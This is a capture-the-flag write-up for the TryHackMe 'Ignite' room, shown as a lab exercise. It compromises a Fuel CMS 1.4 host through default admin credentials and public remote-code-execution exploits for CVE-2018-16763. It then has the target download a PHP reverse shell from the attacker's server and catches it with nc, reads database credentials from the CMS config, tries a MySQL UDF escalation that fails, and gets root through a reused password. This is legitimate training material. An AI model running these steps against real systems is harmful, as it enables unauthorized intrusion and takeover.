# Ignite

URL: https://tryhackme.com/room/ignite

Level: Easy

Date: 23 Jul 2023

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
	- [HTTP](#http)
	- [Fuel CMS](#fuel-cms)
	- [RCE](#rce)
	
- [User flag](#user-flag)
- [Better RCE](#better-rce)
- [Privesc](#privesc)
	- [MySQL](#mysql)
	- [Rabbit Hole](#rabbit-hole)
	- [Root flag](#root-flag)
	




## Reconnaissance

### nmap

```bash
$ sudo nmap -T4 -n -p- 10.10.191.205 -oA nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-24 08:36 CEST
Nmap scan report for 10.10.191.205
Host is up (0.077s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 68.45 seconds
```

```bash
$ sudo nmap -T4 -n -p80 -sC -sV 10.10.191.205 -oA nmap2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-24 08:37 CEST
Nmap scan report for 10.10.191.205
Host is up (0.052s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.79 seconds
```

### http

![](Pasted%20image%2020230724083951.png)

We know from `robots.txt` that there is `/fuel` path also:

![](Pasted%20image%2020230724084051.png)

### Fuel CMS

We can access to backend with `admin:admin`:

![](Pasted%20image%2020230724084426.png)

We know that we are running version 1.4

### RCE

Let's try this:

https://www.exploit-db.com/exploits/47138

Let's edit a bit:

```python
..
..
import requests
import urllib

url = "http://10.10.14.144"
..
..
```

We launch `Burpsuite` but we turn off intercept.

```bash
$ python2 47138.py
cmd:id
systemuid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
cmd:ls -l /home/www-data
systemtotal 4
-rw-r--r-- 1 root root 34 Jul 26  2019 flag.txt
```

## user flag

```bash
cmd:cat /home/www-data/flag.txt
system6470e394cbf6dab6a91682cc8585XXXX
```

`6470e394cbf6dab6a91682cc8585XXXX`

## better RCE

```bash
joshua@kaligra:~/Documents/thm/ignite$ searchsploit -m php/webapps/50477.py
  Exploit: Fuel CMS 1.4.1 - Remote Code Execution (3)
      URL: https://www.exploit-db.com/exploits/50477
     Path: /usr/share/exploitdb/exploits/php/webapps/50477.py
    Codes: CVE-2018-16763
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/joshua/Documents/thm/ignite/50477.py
```

```bash
joshua@kaligra:~/Documents/thm/ignite$ python3 50477.py -u http://10.10.14.144
[+]Connecting...
Enter Command $id
systemuid=33(www-data) gid=33(www-data) groups=33(www-data)


Enter Command $

```

Not so good.

Let's try with `php-reverse-shell.php` from pentestmonkey.net

```bash
joshua@kaligra:~/Documents/thm/ignite$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
Enter Command $wget http://10.8.100.14:8000/rev.php
system

Enter Command $ls
systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt

```

We cannot write to document_root; let's try to `/var/www/html`


```bash
Enter Command $wget http://10.8.100.14:8000/rev.php
system

Enter Command $ls
systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
lol
rev.php
rev.php.1
rev.php.10
rev.php.11
rev.php.12
rev.php.2
rev.php.3
rev.php.4
rev.php.5
rev.php.6
rev.php.7
rev.php.8
rev.php.9
robots.txt


```


![](Pasted%20image%2020230724205623.png)

```bash
joshua@kaligra:~/Documents/thm/ignite$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.8.100.14] from (UNKNOWN) [10.10.14.144] 50894
Linux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 11:55:06 up 27 min,  0 users,  load average: 1.07, 1.03, 0.85
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$

```

```bash
www-data@ubuntu:/$ ^Z
[1]+  Stopped                 nc -nvlp 4444
joshua@kaligra:~/Documents/thm/ignite$ stty raw -echo
joshua@kaligra:~/Documents/thm/ignite$
nc -nvlp 4444

www-data@ubuntu:/$
www-data@ubuntu:/$
www-data@ubuntu:/$

```

## privesc

### mysql

https://github.com/daylightstudio/FUEL-CMS/blob/master/fuel/application/config/database.php

```bash
www-data@ubuntu:/var/www/html$ grep -A10 'dsn' fuel/application/config/databas>
|       ['dsn']      The full DSN string describe a connection to the database.
|       ['hostname'] The hostname of your database server.
|       ['username'] The username used to connect to the database
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
|       ['dbdriver'] The database driver. e.g.: mysqli.
|                       Currently supported:
|                                cubrid, ibase, mssql, mysql, mysqli, oci8,
|                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
|       ['dbprefix'] You can add an optional prefix, which will be added
|                                to the table name when using the  Query Builder class
--
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'XXXXXXX',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
```

### rabbit hole

No luck with:

https://www.exploit-db.com/raw/1518

```bash
www-data@ubuntu:/var/www/html$ mysql -uroot -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 69
Server version: 5.7.27-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.56 sec)

mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
Query OK, 1 row affected (0.08 sec)

mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
mysql>

```

### root flag

Is that simple??

root password is the same of MySQL's root user!

```bash
www-data@ubuntu:/var/www/html$ su -
Password:
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# ls
root.txt
root@ubuntu:~# cat root.txt
b9bbcb33e11b80be759c4e84XXXXXXX
root@ubuntu:~#

```

